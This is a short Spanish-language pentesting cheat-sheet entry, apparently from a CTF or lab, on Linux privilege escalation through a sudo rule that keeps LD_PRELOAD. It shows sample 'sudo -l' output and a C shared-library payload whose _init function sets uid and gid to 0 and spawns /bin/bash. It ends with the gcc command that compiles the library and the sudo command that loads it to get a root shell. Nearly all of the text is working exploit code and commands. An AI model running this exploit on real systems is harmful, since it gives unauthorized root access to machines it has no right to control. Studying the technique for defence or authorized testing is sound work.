Si sudo muestra **env_keep+=LD_PRELOAD** se puede explotar compilando un binario en C.
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
Ejemplo:
```perl
Matching Defaults entries for paul on preload:                     
    env_reset, mail_badpass, -----env_keep+=LD_PRELOAD------, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin       
                                                                                                                                       
User paul may run the following commands on preload:               
    (root) NOPASSWD: /usr/bin/cat
```

Programa en C
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

Compilar
```
gcc -fPIC -shared -o shell.o shell.c -nostartfiles
```
Ejecutar
```
sudo LD_PRELOAD=/tmp/shell.o /usr/bin/cat
```